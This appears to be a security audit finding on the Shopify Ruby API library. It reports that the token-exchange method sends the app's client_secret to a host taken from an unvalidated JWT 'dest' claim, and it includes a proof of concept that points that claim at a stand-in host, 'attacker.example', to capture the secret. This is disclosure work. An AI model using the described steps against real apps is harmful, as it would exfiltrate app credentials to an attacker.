### Title
`TokenExchange.exchange_token` sends the app's `client_secret` to a host derived from the JWT `dest` claim without validating it against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the request host for the token-exchange call directly from the session token's `dest` claim via `JwtPayload#shop`, and never runs it through `Utils::ShopValidator`. That unvalidated host is then used by `HttpClient` to build the base URI to which the request body — containing `client_id` and the app's `client_secret` — is POSTed. The sibling method `TokenExchange.migrate_to_expiring_token`, which sends the exact same secret-bearing payload, does call `Utils::ShopValidator.sanitize!(shop)` first. The validation is present in the codebase but not applied consistently to every code path that transmits the `client_secret`.

### Finding Description
`JwtPayload#shop` is implemented as a bare string transform with no domain check: [1](#0-0) 

`exchange_token` takes that value (`dest_shop`) and uses it, unsanitized, to build the `Session` used for the outbound HTTP request that carries the app's `client_secret`: [2](#0-1) 

`HttpClient#initialize` then builds the request's base URI directly from `session.shop`, with no host allow-listing: [3](#0-2) 

Contrast this with `migrate_to_expiring_token` in the same module, which builds an identical secret-bearing request body but first passes the caller-supplied `shop` through `Utils::ShopValidator.sanitize!`, which restricts the resulting host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`): [4](#0-3) [5](#0-4) 

The identity binding that should hold is: `host that receives client_secret == host validated against ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. In `exchange_token` this equality is not enforced — the destination host is taken as-is from `dest`, while `migrate_to_expiring_token` (and other OAuth flows, e.g. `client_credentials.rb`, `refresh_token.rb`) enforce it. `JwtPayload.new` only checks HMAC signature, `exp`/`nbf` (with 10s leeway), and `aud == Context.api_key` — it never validates that `iss`/`dest` resolve to a trusted Shopify domain shape.

### Impact Explanation
If the `dest` claim of an otherwise validly-signed session token can be made to resolve to a non-Shopify host (for example, through session-token confusion between different token issuers such as the checkout UI extension token type, which has a different `iss` format and is not restricted in `JwtPayload`), `exchange_token` will POST the app's `client_id`/`client_secret` and the `subject_token` to that host. This is credential exfiltration of the app's `client_secret` via an uncontrolled destination — matching the "SSRF with the app's credentials" / credential-leak impact class.

### Likelihood Explanation
Medium-low. Session tokens are signed with the app's own `api_secret_key`, so tampering with `dest` in a token issued directly by Shopify requires either a bug in Shopify's token issuance or acceptance of a token type/`iss` that the app does not expect (the class explicitly supports `admin` and `checkouts` issuers with differing trust assumptions, and `JwtPayload` does not restrict `iss`/`dest` format at all). The library itself already treats this as a real risk elsewhere (the `sanitize!` call in `migrate_to_expiring_token`), so the missing check in `exchange_token` is an inconsistency rather than a defense that was deliberately judged unnecessary.

### Recommendation
Apply `Utils::ShopValidator.sanitize!` (or equivalent) to `jwt_payload.shop`/`dest_shop` in `TokenExchange.exchange_token` before it is used to construct the `Session`/`HttpClient`, exactly as already done in `TokenExchange.migrate_to_expiring_token`. More generally, `JwtPayload` should validate that `dest` (and `iss`) resolve to a `TRUSTED_SHOPIFY_DOMAINS` host at decode time so every consumer of `JwtPayload#shop` inherits the guarantee, instead of relying on each call site to remember to sanitize independently.

### Proof of Concept
1. Obtain (or synthesize, for a test/PoC in a controlled environment) a session token signed with the app's `api_secret_key` whose `dest` claim is set to an attacker-controlled host, e.g. `https://attacker.example`.
2. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
3. `jwt_payload.shop` returns `"attacker.example"` unmodified (`lib/shopify_api/auth/jwt_payload.rb:47-51`); `HttpClient` builds `@base_uri = "https://attacker.example"` (`lib/shopify_api/clients/http_client.rb:18`); the POST to `/admin/oauth/access_token` on that host includes `client_id` and `client_secret` in the JSON body (`lib/shopify_api/auth/token_exchange.rb:52-59`), leaking the app's `client_secret` to the attacker-controlled host.
4. Compare with `ShopifyAPI::Auth::TokenExchange.migrate_to_expiring_token(shop: "attacker.example", ...)`, which raises `ShopifyAPI::Errors::InvalidShopError` because it runs the shop through `Utils::ShopValidator.sanitize!` first — demonstrating the protection exists in the library but is not applied in `exchange_token`.
